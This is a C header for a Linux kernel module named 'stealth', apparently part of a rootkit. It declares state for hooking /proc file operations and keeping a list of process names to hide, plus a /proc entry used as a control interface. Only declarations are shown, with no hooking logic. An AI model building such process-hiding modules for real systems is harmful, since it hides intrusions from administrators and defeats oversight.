#ifndef MODULE_H
#define MODULE_H

#include <linux/module.h> // module_init, module_exit
#include <linux/kernel.h> 
#include <linux/init.h>
#include <linux/mm.h> // vmalloc
#include <net/sock.h> // inode, file_operations

#include "config.h"

// This type represents the state of the `stealth' kernel module.
typedef struct {
    // Process hiding
    struct inode* proc_inode;
    struct file_operations proc_fops;
    struct file_operations* orig_proc_fops;

    char hidden_processes[HIDDEN_PROCESSES][PROCESS_LENGTH];
    int hidden_process_count;

    // API
    struct proc_dir_entry* proc_handler;
} stealth_t;

#include "processes.h"
#include "api.h"

#endif 
